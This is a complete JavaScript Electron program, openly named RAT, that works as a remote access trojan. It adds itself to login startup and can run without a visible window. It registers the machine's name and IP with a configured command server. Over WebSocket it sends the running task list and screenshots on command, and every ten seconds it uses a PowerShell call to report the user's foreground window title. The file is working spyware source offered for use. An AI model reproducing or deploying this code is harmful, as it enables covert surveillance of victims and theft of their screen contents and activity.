const { app, BrowserWindow } = require('electron');
const axios = require('axios');
const WebSocket = require('ws');
const os = require('os');
const { execSync } = require('child_process');
const screenshot = require('desktop-screenshot');
const FormData = require('form-data');
const fs = require('fs');


class RAT {
  constructor(configuration) {
    this.server_url = `${configuration.server_url}:${configuration.server_port}`;

    this.window = null;
    this.user_id = null;
    this.pc_name = null;
    this.connect_time = null;
    this.ip_address = null;
    this.ws = null;

    this.commands = {
      'send_tasklist': () => this.sendTasklistRequest(),
      'send_screenshot': () => this.sendScreenshotRequest(),
      'send_ping': () => this.sendPingRequest(),
    }

    if (configuration.show_window) this.createWindow();

    if (configuration.enable_autoload) {
      app.setLoginItemSettings({
        openAtLogin: true
      })
    };

    this.setCurrentID();
  }

  onWebSocketMessage(message) {
    const data = JSON.parse(message);

    if (!(data.command in this.commands)) return;
    if (data.id !== this.user_id) return;

    this.commands[data.command](data);
  }

  onWebSocketConnected() {
    this.sendConnectRequest();
    this.addOnQuitEvent();
    this.startWindowGrabber();
  }

  sendScreenshotRequest() {
    screenshot("screenshot.png", (error, complete) => {
      if(error)
          console.log("Screenshot failed", error);
      else {
        let fdata = new FormData();
        fdata.append('file', fs.createReadStream('screenshot.png'));

        axios.post(`http://${this.server_url}/save_picture/`, fdata, {
          headers: {
            'accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.8',
            'Content-Type': `multipart/form-data; boundary=${fdata._boundary}`,
          }
        }).then((response) => {
          const result = {
            id: this.user_id,
            command: 'screenshot_sended',
            screenshot_url: response.data.sc_url,
          };
          this.ws.send(JSON.stringify(result));
        });
      };
    });
  }

  sendTasklistRequest() {
    const response = {
      id: this.user_id,
      command: 'tasklist_sended',
      tasks: execSync('tasklist').toString().trim(),
    };
    this.ws.send(JSON.stringify(response));
  }

  sendPingRequest() {
    const response = {
      id: this.user_id,
      command: 'ping_sended',
    };
    this.ws.send(JSON.stringify(response));
  }

  addOnQuitEvent() {
    app.on('will-quit', () => {
      const request = {
        id: this.user_id,
        command: 'disconnect',
      };

      this.ws.send(JSON.stringify(request));
    });
  }

  sendConnectRequest() {
    const request = {
      id: this.user_id,
      command: 'connect',
      pc_name: this.pc_name,
      connect_time: this.connect_time,
      ip: this.ip_address,
    };

    this.ws.send(JSON.stringify(request));
  };

  // Start sending current foreground window every 10 seconds
  startWindowGrabber() {
    let command = `
Add-Type  @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class APIFuncs
  {
  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern int GetWindowText(IntPtr hwnd,StringBuilder
lpString, int cch);
  [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
  public static extern IntPtr GetForegroundWindow();
  [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
      public static extern Int32 GetWindowThreadProcessId(IntPtr hWnd,out
Int32 lpdwProcessId);
  [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
      public static extern Int32 GetWindowTextLength(IntPtr hWnd);
  }
"@

$w = [apifuncs]::GetForegroundWindow()
$len = [apifuncs]::GetWindowTextLength($w)
$sb = New-Object text.stringbuilder -ArgumentList ($len + 1)
$rtnlen = [apifuncs]::GetWindowText($w,$sb,$sb.Capacity)
write-host "$($sb.tostring())"
    `;

    const response = {
      id: this.user_id,
      command: 'activity_sended',
      activity: execSync(command, {'shell': 'powershell'}).toString().trim(),
    };
    this.ws.send(JSON.stringify(response));

    setTimeout(() => {
      this.startWindowGrabber();
    }, 10000);
  }

  connectWebSocket() {
    this.ws = new WebSocket(
      'ws://' + this.server_url + '/ws/list/',
    );

    this.ws.onmessage = (event) => {
      this.onWebSocketMessage(event.data);
    };

    this.ws.addEventListener('open', () => {
      console.log('Connected to websocket');
      this.onWebSocketConnected();
    });

    // Reconnect websocket on close
    this.ws.addEventListener('close', () => {
      console.log('Disconnected from websocket');
      this.setCurrentID();
    });
  }

  // Create window for easy close application if flag is true
  createWindow() {
    this.window = new BrowserWindow({
      width: 800,
      height: 600,
    });
  }

  // Getting ID of user from server, and trying to connect websocket
  setCurrentID(timeout=null) {
    axios({
      method: 'get',
      url: `http://${this.server_url}/get_id/`,
      data: {
        'pc_name': os.hostname(),
      },
    })
    .then((response) => {
      console.log('ID from server: ' + response.data.id);
      this.user_id = response.data.id;
      this.pc_name = response.data.pc_name;
      this.connect_time = response.data.connect_time;
      this.ip_address = response.data.ip;
      this.connectWebSocket();
    }).catch(() => {
      console.log('Trying to get ID from server...');
      if (timeout) clearTimeout(timeout);
      timeout = setTimeout(() => {this.setCurrentID()}, 10000);
    });
  }
}


// Start the app
app.whenReady().then(() => {
  let conf = {};
  const f_data = fs.readFileSync('enviroment', 'utf8');
  f_data.split('\n').filter(line => {
    return !line.startsWith('#');
  }).forEach(line => {
    const [key, value] = line.trim().split('=');
    if (['true', 'false'].indexOf(value.toLocaleLowerCase()) > -1) {
      conf[key] = value === 'true';
    } else {
      conf[key] = value;
    };
  });

  let rat = new RAT(conf);
});
